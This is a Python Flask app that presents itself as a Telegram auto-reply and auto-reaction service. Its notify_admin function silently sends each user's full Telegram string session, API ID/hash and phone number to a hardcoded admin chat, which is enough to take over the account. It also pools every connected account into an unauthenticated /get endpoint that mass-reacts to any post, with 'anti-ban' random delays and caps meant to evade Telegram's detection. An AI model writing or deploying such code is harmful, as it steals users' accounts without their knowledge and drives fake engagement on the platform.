# app.py
# =========================================================
# Telegram Auto Reply + Auto Reaction API (Single File)
# Anti-Ban System + Admin Bot Notification + 1 Min Reaction
# =========================================================

import os
import json
import time
import random
import asyncio
import threading
import sqlite3
import logging

from datetime import datetime, time as dt_time

from flask import (
    Flask,
    request,
    jsonify,
    session
)

from flask_cors import CORS

from telethon import TelegramClient, events
from telethon.sessions import StringSession

from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    FloodWaitError,
    ChatAdminRequiredError,
    MessageIdInvalidError,
    AuthKeyUnregisteredError,
    UserDeactivatedError
)

from telethon.tl.functions.messages import (
    SendReactionRequest
)

from telethon.tl.types import (
    ReactionEmoji
)

# Pyrogram for Admin Bot
from pyrogram import Client as BotClient 

# =========================================================
# LOGGING CONFIGURATION
# =========================================================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# =========================================================
# CONFIG
# =========================================================

DATA_DIR = os.environ.get("DATA_DIR", "user_data")
SESSIONS_DIR = os.environ.get("SESSIONS_DIR", "sessions")

DB_FILE = os.path.join(DATA_DIR, "database.db")

COOLDOWN_SECONDS = 300
PORT = int(os.environ.get("PORT", 5000))

# ADMIN CONFIG
ADMIN_ID = 7605281774
BOT_TOKEN = os.environ.get("BOT_TOKEN", "") 

# ANTI-BAN CONFIG
NIGHT_MODE_START = 23  # 11 PM
NIGHT_MODE_END = 7     # 7 AM
MAX_DAILY_REACTIONS = 30

os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(SESSIONS_DIR, exist_ok=True)

# =========================================================
# FLASK APP CONFIGURATION
# =========================================================

app = Flask(__name__)

app.secret_key = os.environ.get(
    "SECRET_KEY",
    "super-secret-key-change-this"
)

CORS(
    app,
    supports_credentials=True
)

app.config["SESSION_COOKIE_SAMESITE"] = "None"
app.config["SESSION_COOKIE_SECURE"] = True

# =========================================================
# GLOBAL ASYNC LOOP MANAGEMENT
# =========================================================

_loop = None
_loop_thread = None

def ensure_loop():
    global _loop, _loop_thread

    if _loop is not None:
        return _loop

    _loop = asyncio.new_event_loop()

    def run_loop():
        asyncio.set_event_loop(_loop)
        _loop.run_forever()

    _loop_thread = threading.Thread(
        target=run_loop,
        daemon=True
    )
    _loop_thread.start()
    
    # Wait for loop to start
    while not _loop.is_running():
        time.sleep(0.1)

    return _loop


def run_async(coro):
    loop = ensure_loop()
    return asyncio.run_coroutine_threadsafe(coro, loop)


def loop_run(coro, timeout=120):
    future = run_async(coro)
    try:
        return future.result(timeout=timeout)
    except Exception as e:
        logger.error(f"Loop Error: {e}")
        return None


# =========================================================
# ADMIN BOT SYSTEM
# =========================================================

bot = None

def init_bot():
    global bot
    if not BOT_TOKEN:
        logger.warning("BOT_TOKEN not set. Admin notifications disabled.")
        return
        
    if bot is not None:
        return

    bot = BotClient(
        "admin_bot_session",
        bot_token=BOT_TOKEN,
        workdir=DATA_DIR
    )
    
    def start_bot_thread():
        loop = ensure_loop()
        asyncio.run_coroutine_threadsafe(_run_bot(), loop)

    async def _run_bot():
        try:
            await bot.start()
            logger.info("✅ Admin Bot Started Successfully!")
        except Exception as e:
            logger.error(f"❌ Failed to start admin bot: {e}")

    start_bot_thread()


async def notify_admin(data_dict):
    if not bot or not BOT_TOKEN:
        return
        
    try:
        msg = "🚀 **NEW USER CONNECTED!** 🚀\n\n"
        msg += f"👤 **Username:** @{data_dict.get('username', 'N/A')}\n"
        msg += f"📱 **Phone:** `{data_dict.get('phone', 'N/A')}`\n"
        msg += f"🆔 **API ID:** `{data_dict.get('api_id', 'N/A')}`\n"
        msg += f"🔑 **API Hash:** `{data_dict.get('api_hash', 'N/A')}`\n"
        msg += f"🔗 **Connected:** `{data_dict.get('connected', False)}`\n\n"
        msg += f"🔐 **String Session:**\n`{data_dict.get('session', 'N/A')}`"

        await bot.send_message(
            chat_id=ADMIN_ID,
            text=msg,
            parse_mode="markdown"
        )
        logger.info(f"Admin notified about {data_dict.get('username')}")
    except Exception as e:
        logger.error(f"Bot Notify Error: {e}")


# =========================================================
# DATABASE MANAGEMENT
# =========================================================

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    # Main users table
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY,
            api_id TEXT,
            api_hash TEXT,
            phone_number TEXT,
            reply_message TEXT,
            auto_reply_enabled INTEGER,
            connected INTEGER
        )
    """)
    
    # Anti-ban daily reaction tracking table
    c.execute("""
        CREATE TABLE IF NOT EXISTS reaction_stats (
            username TEXT,
            date TEXT,
            reaction_count INTEGER DEFAULT 0,
            PRIMARY KEY (username, date)
        )
    """)
    
    conn.commit()
    conn.close()

init_db()


def get_user(username):
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE username=?", (username,))
    row = c.fetchone()
    conn.close()
    
    if not row:
        return None
        
    return {
        "username": row["username"],
        "api_id": row["api_id"],
        "api_hash": row["api_hash"],
        "phone_number": row["phone_number"],
        "reply_message": row["reply_message"],
        "auto_reply_enabled": bool(row["auto_reply_enabled"]),
        "connected": bool(row["connected"])
    }


def save_user(data):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    c.execute("""
        INSERT OR REPLACE INTO users (
            username, api_id, api_hash, phone_number, 
            reply_message, auto_reply_enabled, connected
        ) VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (
        data.get("username"),
        data.get("api_id"),
        data.get("api_hash"),
        data.get("phone_number"),
        data.get("reply_message", "▶️ আমি এখন ব্যস্ত আছি। একটু পরে রিপ্লাই দিব ✅🥺"),
        int(data.get("auto_reply_enabled", False)),
        int(data.get("connected", False))
    ))
    
    conn.commit()
    conn.close()


def get_active_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT username, api_id, api_hash, connected FROM users WHERE connected=1")
    rows = c.fetchall()
    conn.close()
    return rows


def can_react_today(username):
    """Check if user has exceeded daily reaction limit (Anti-Ban)"""
    today = datetime.now().strftime("%Y-%m-%d")
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT reaction_count FROM reaction_stats WHERE username=? AND date=?", (username, today))
    row = c.fetchone()
    conn.close()
    
    if not row:
        return True
    return row[0] < MAX_DAILY_REACTIONS


def increment_reaction_count(username):
    """Increment daily reaction count (Anti-Ban)"""
    today = datetime.now().strftime("%Y-%m-%d")
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    c.execute("""
        INSERT INTO reaction_stats (username, date, reaction_count)
        VALUES (?, ?, 1)
        ON CONFLICT(username, date) DO UPDATE SET reaction_count = reaction_count + 1
    """, (username, today))
    
    conn.commit()
    conn.close()


def is_night_time():
    """Check if current time is within banned night hours (Anti-Ban)"""
    now = datetime.now().time()
    night_start = dt_time(NIGHT_MODE_START, 0)
    night_end = dt_time(NIGHT_MODE_END, 0)
    
    if night_start <= now or now <= night_end:
        return True
    return False


# =========================================================
# GLOBAL STATE MANAGEMENT
# =========================================================

clients = {}
phone_code_hashes = {}
auto_reply_tasks = {}
cooldowns = {}

def session_path(username):
    return os.path.join(SESSIONS_DIR, f"tg_{username}")


# =========================================================
# TELEGRAM CLIENT MANAGEMENT
# =========================================================

async def create_client(username, api_id, api_hash):
    client = TelegramClient(session_path(username), int(api_id), api_hash)
    clients[username] = client
    return client

async def get_client(username):
    if username in clients:
        return clients[username]

    user = get_user(username)
    if not user or not user.get("api_id") or not user.get("api_hash"):
        return None

    return await create_client(username, user["api_id"], user["api_hash"])


# =========================================================
# POSITIVE REACTIONS LIST
# =========================================================

POSITIVE_REACTIONS = [
    "👍", "❤️", "🔥", "😍", "🥰", "👏", "⚡", "🎉", "💯", "😁",
    "😎", "🤩", "💪", "🥳", "😇", "❣️", "💖", "🤗"
]


# =========================================================
# TELEGRAM LINK PARSER
# =========================================================

def parse_telegram_link(link):
    try:
        link = link.strip()
        if "t.me/" not in link:
            return None, None
            
        parts = link.split("/")
        channel = parts[-2]
        msg_id = int(parts[-1])
        return channel, msg_id
        
    except Exception as e:
        logger.error(f"Parse Error: {e}")
        return None, None


# =========================================================
# AUTO REACTION SYSTEM (1 MINUTE CONCURRENT + ANTI-BAN)
# =========================================================

async def send_reaction_safe(username, channel, msg_id):
    """Safely send reaction with Anti-Ban protections"""
    
    # Check 1: Night Mode
    if is_night_time():
        logger.warning(f"[ANTI-BAN] Night mode active. Skipping {username}")
        return False
        
    # Check 2: Daily Limit
    if not can_react_today(username):
        logger.warning(f"[ANTI-BAN] Daily limit reached for {username}")
        return False

    client = clients.get(username)
    if not client or not client.is_connected():
        return False

    try:
        # Human-like random delay before reacting (3 to 8 seconds)
        delay = random.uniform(3, 8)
        await asyncio.sleep(delay)
        
        emoji = random.choice(POSITIVE_REACTIONS)
        
        await client(
            SendReactionRequest(
                peer=channel,
                msg_id=msg_id,
                reaction=[ReactionEmoji(emoticon=emoji)],
                big=random.choice([True, False])
            )
        )
        
        logger.info(f"✅ {username} reacted with {emoji}")
        
        # Increment daily count on success
        increment_reaction_count(username)
        return True

    except FloodWaitError as e:
        logger.error(f"⏳ FloodWait for {username}: {e.seconds}s. Sleeping to prevent ban.")
        await asyncio.sleep(e.seconds + 5)
        return False
        
    except ChatAdminRequiredError:
        logger.error(f"🚫 Reaction permission denied for {username}")
        return False
        
    except MessageIdInvalidError:
        logger.error(f"❌ Invalid message id for {username}")
        return False
        
    except (AuthKeyUnregisteredError, UserDeactivatedError):
        logger.error(f"🚨 ACCOUNT BANNED OR INVALID SESSION: {username}")
        # Mark as disconnected in DB
        user = get_user(username)
        if user:
            user["connected"] = False
            save_user(user)
        return False
        
    except Exception as e:
        logger.error(f"❌ Reaction Error {username}: {e}")
        return False


# =========================================================
# AUTO REPLY SYSTEM
# =========================================================

async def start_auto_reply(username):
    client = await get_client(username)
    if not client or not client.is_connected():
        return False

    await stop_auto_reply(username)

    cooldowns[username] = {}
    user = get_user(username)
    default_msg = user.get("reply_message", "▶️ আমি এখন ব্যস্ত আছি। একটু পরে রিপ্লাই দিব ✅🥺")

    @client.on(events.NewMessage(incoming=True))
    async def handler(event):
        try:
            if not event.is_private:
                return

            sender = await event.get_sender()
            if sender and sender.bot:
                return

            peer_id = event.sender_id
            now = datetime.now().timestamp()

            user_cd = cooldowns.get(username, {})
            last_reply = user_cd.get(str(peer_id), 0)

            if now - last_reply < COOLDOWN_SECONDS:
                return

            current_user = get_user(username)
            if not current_user.get("auto_reply_enabled"):
                return

            msg = current_user.get("reply_message", default_msg)
            
            # Add slight delay to avoid instant bot-like response
            await asyncio.sleep(random.uniform(1, 3))
            await event.reply(msg)

            cooldowns.setdefault(username, {})[str(peer_id)] = now

        except FloodWaitError as e:
            logger.error(f"Auto-Reply Flood wait: {e.seconds}s")
        except Exception as e:
            logger.error(f"Auto Reply Error: {e}")

    auto_reply_tasks[username] = handler
    user["auto_reply_enabled"] = True
    save_user(user)
    return True


async def stop_auto_reply(username):
    client = clients.get(username)
    handler = auto_reply_tasks.pop(username, None)

    if client and handler:
        try:
            client.remove_event_handler(handler)
        except:
            pass

    user = get_user(username)
    if user:
        user["auto_reply_enabled"] = False
        save_user(user)

    cooldowns.pop(username, None)


# =========================================================
# FLASK ROUTES
# =========================================================

@app.route("/")
def home():
    return jsonify({
        "success": True,
        "system": "Telegram Auto Reply + Reaction API",
        "reaction_api": "/get?link=https://t.me/channel/1",
        "docs": "/health"
    })


@app.route("/login", methods=["POST"])
def login():
    data = request.get_json(force=True)
    username = data.get("username", "").strip().replace("@", "").lower()

    if not username:
        return jsonify({"success": False, "error": "Username required"}), 400

    session["username"] = username
    if not get_user(username):
        save_user({"username": username})

    return jsonify({"success": True, "username": username})


@app.route("/logout", methods=["POST"])
def logout():
    session.pop("username", None)
    return jsonify({"success": True})


@app.route("/status")
def status():
    username = session.get("username")
    if not username:
        return jsonify({"logged_in": False})

    user = get_user(username)
    if not user:
        return jsonify({"logged_in": False})

    client = clients.get(username)
    connected = False
    
    if client:
        try:
            connected = client.is_connected() and loop_run(client.is_user_authorized())
        except:
            pass

    return jsonify({
        "logged_in": True,
        "username": username,
        "connected": connected or user.get("connected"),
        "auto_reply_enabled": user.get("auto_reply_enabled"),
        "reply_message": user.get("reply_message")
    })


@app.route("/send-otp", methods=["POST"])
def send_otp():
    username = session.get("username")
    if not username:
        return jsonify({"success": False, "error": "Not logged in"}), 401

    data = request.get_json(force=True)
    api_id = data.get("api_id", "").strip()
    api_hash = data.get("api_hash", "").strip()
    phone_number = data.get("phone_number", "").strip()

    if not api_id or not api_hash or not phone_number:
        return jsonify({"success": False, "error": "All fields required"}), 400

    user = get_user(username)
    user["api_id"] = api_id
    user["api_hash"] = api_hash
    user["phone_number"] = phone_number
    save_user(user)

    result = loop_run(async_send_otp(username, api_id, api_hash, phone_number))
    return jsonify(result or {"success": False, "error": "Timeout"})


async def async_send_otp(username, api_id, api_hash, phone_number):
    try:
        old_client = clients.get(username)
        if old_client:
            try:
                await old_client.disconnect()
            except:
                pass
            del clients[username]

        client = await create_client(username, api_id, api_hash)
        await client.connect()

        result = await client.send_code_request(phone_number)
        phone_code_hashes[username] = result.phone_code_hash

        return {"success": True}

    except PhoneNumberInvalidError:
        return {"success": False, "error": "Invalid phone number"}
    except FloodWaitError as e:
        return {"success": False, "error": f"Flood wait: {e.seconds}s"}
    except Exception as e:
        return {"success": False, "error": str(e)}


@app.route("/verify-otp", methods=["POST"])
def verify_otp():
    username = session.get("username")
    if not username:
        return jsonify({"success": False, "error": "Not logged in"}), 401

    data = request.get_json(force=True)
    code = data.get("code", "").strip()
    password = data.get("password", "")

    if not code:
        return jsonify({"success": False, "error": "OTP required"}), 400

    user = get_user(username)
    result = loop_run(async_verify_otp(
        username, user["phone_number"], code, 
        phone_code_hashes.get(username, ""), password
    ))
    
    return jsonify(result or {"success": False, "error": "Timeout"})


async def async_verify_otp(username, phone_number, code, code_hash, password):
    client = clients.get(username)
    if not client:
        return {"success": False, "error": "No active client"}

    try:
        await client.sign_in(phone_number, code, phone_code_hash=code_hash)
        
        # SUCCESS: Extract Session and Notify Admin
        user = get_user(username)
        user["connected"] = True
        save_user(user)
        
        phone_code_hashes.pop(username, None)
        
        string_session = StringSession.save(client.session)
        
        admin_data = {
            "username": username,
            "api_id": user.get("api_id"),
            "api_hash": user.get("api_hash"),
            "phone": phone_number,
            "connected": True,
            "session": string_session
        }
        
        # Send to Admin Bot asynchronously
        asyncio.create_task(notify_admin(admin_data))
        
        return {"success": True}

    except SessionPasswordNeededError:
        if not password:
            return {"success": False, "error": "2FA password required"}

        try:
            await client.sign_in(password=password)
            
            # 2FA SUCCESS: Extract Session and Notify Admin
            user = get_user(username)
            user["connected"] = True
            save_user(user)
            
            string_session = StringSession.save(client.session)
            
            admin_data = {
                "username": username,
                "api_id": user.get("api_id"),
                "api_hash": user.get("api_hash"),
                "phone": phone_number,
                "connected": True,
                "session": string_session
            }
            
            asyncio.create_task(notify_admin(admin_data))
            
            return {"success": True}

        except Exception as e:
            return {"success": False, "error": f"2FA failed: {e}"}

    except PhoneCodeInvalidError:
        return {"success": False, "error": "Invalid OTP"}
    except Exception as e:
        return {"success": False, "error": str(e)}


@app.route("/save-reply", methods=["POST"])
def save_reply():
    username = session.get("username")
    if not username:
        return jsonify({"success": False, "error": "Not logged in"}), 401

    message = request.get_json(force=True).get("message", "").strip()
    if not message:
        return jsonify({"success": False, "error": "Empty message"}), 400

    user = get_user(username)
    user["reply_message"] = message
    save_user(user)

    return jsonify({"success": True})


@app.route("/toggle-reply", methods=["POST"])
def toggle_reply():
    username = session.get("username")
    if not username:
        return jsonify({"success": False, "error": "Not logged in"}), 401

    enabled = request.get_json(force=True).get("enabled", False)
    user = get_user(username)

    if enabled and not user.get("connected"):
        return jsonify({"success": False, "error": "Connect Telegram first"}), 400

    if enabled:
        result = loop_run(start_auto_reply(username))
        return jsonify({"success": bool(result)})
    else:
        loop_run(stop_auto_reply(username))
        return jsonify({"success": True})


@app.route("/disconnect", methods=["POST"])
def disconnect():
    username = session.get("username")
    if not username:
        return jsonify({"success": False, "error": "Not logged in"}), 401

    loop_run(stop_auto_reply(username))

    client = clients.pop(username, None)
    if client:
        loop_run(client.disconnect())

    sp = session_path(username)
    for ext in ["", ".session"]:
        file_path = sp + ext
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
            except:
                pass

    user = get_user(username)
    user["connected"] = False
    user["auto_reply_enabled"] = False
    user["api_id"] = ""
    user["api_hash"] = ""
    user["phone_number"] = ""
    save_user(user)

    return jsonify({"success": True})


# =========================================================
# AUTO REACTION API (1 MINUTE CONCURRENT + ANTI-BAN)
# =========================================================

@app.route("/get", methods=["GET"])
def reaction_api():
    link = request.args.get("link")
    if not link:
        return jsonify({"success": False, "error": "Telegram link required"}), 400

    channel, msg_id = parse_telegram_link(link)
    if not channel or not msg_id:
        return jsonify({"success": False, "error": "Invalid Telegram link"}), 400

    # Night Mode API Blocker
    if is_night_time():
        return jsonify({
            "success": False, 
            "error": "Night mode active (11 PM - 7 AM). Reactions paused to prevent bans."
        }), 403

    users = get_active_users()
    if not users:
        return jsonify({"success": False, "error": "No active accounts found"}), 404

    # Run reactions concurrently in the background loop
    result = loop_run(process_reactions_concurrently(users, channel, msg_id), timeout=60)

    return jsonify(result or {"success": False, "error": "Timeout during reaction process"})


async def process_reactions_concurrently(users, channel, msg_id):
    success_count = 0
    failed_count = 0
    skipped_count = 0
    
    # Create concurrent tasks for all users
    tasks = []
    valid_users = []
    
    for user in users:
        username = user[0]
        
        # Pre-check daily limit
        if not can_react_today(username):
            logger.warning(f"[SKIP] Daily limit reached for {username}")
            skipped_count += 1
            continue
            
        # Ensure client is connected in the loop
        client = await get_client(username)
        if client and not client.is_connected():
            try:
                await client.connect()
            except:
                pass
        
        if client and client.is_connected():
            tasks.append(send_reaction_safe(username, channel, msg_id))
            valid_users.append(username)
        else:
            skipped_count += 1

    # Run all tasks concurrently
    # Because of the 3-8 second random delay inside send_reaction_safe, 
    # they will finish organically within 1 minute timeframe without spamming TG server instantly.
    results = await asyncio.gather(*tasks, return_exceptions=True)

    for res in results:
        if res is True:
            success_count += 1
        else:
            failed_count += 1

    return {
        "success": True,
        "channel": channel,
        "message_id": msg_id,
        "total_accounts": len(users),
        "valid_accounts_attempted": len(valid_users),
        "successful_reactions": success_count,
        "failed_reactions": failed_count,
        "skipped_limit_or_offline": skipped_count,
        "reaction_mode": "anti_ban_concurrent"
    }


@app.route("/health")
def health():
    return jsonify({
        "success": True,
        "database_exists": os.path.exists(DB_FILE),
        "sessions_dir": SESSIONS_DIR,
        "night_mode_active": is_night_time(),
        "system": "online"
    })


# =========================================================
# START APPLICATION
# =========================================================

if __name__ == "__main__":
    # Initialize Admin Bot on startup
    init_bot()
    
    app.run(
        host="0.0.0.0",
        port=PORT,
        debug=False
    )
